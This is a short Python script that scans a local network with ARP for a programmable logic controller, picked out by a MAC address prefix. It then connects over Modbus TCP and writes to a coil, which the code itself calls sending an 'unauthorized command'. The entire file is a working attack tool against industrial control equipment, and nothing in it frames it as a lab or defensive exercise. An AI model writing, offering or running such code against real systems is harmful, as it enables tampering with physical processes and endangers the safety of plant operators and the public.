import socket
from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient

def find_plc_ip():
    # Define the network range to scan
    ip_range = "192.168.1.1/24"
    print(f"Scanning network {ip_range} for PLC...")

    # Create an ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Extract the IP addresses from the response
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    # Assuming the PLC has a known MAC address prefix (e.g., 00:1D:9C)
    plc_mac_prefix = "00:1D:9C"
    for device in devices:
        if device['mac'].startswith(plc_mac_prefix):
            print(f"Found PLC at IP: {device['ip']}")
            return device['ip']

    print("PLC not found on the network.")
    return None

def send_unauthorized_command(plc_ip):
    # Connect to the PLC using Modbus TCP/IP
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return

    # Send an unauthorized command (e.g., write to a coil)
    address = 0x0001  # Example coil address
    value = True       # Example value to write
    print(f"Sending unauthorized command to PLC at {plc_ip}...")
    response = client.write_coil(address, value)

    if response.isError():
        print(f"Error sending command: {response}")
    else:
        print(f"Command sent successfully: {response}")

    # Close the connection
    client.close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        send_unauthorized_command(plc_ip)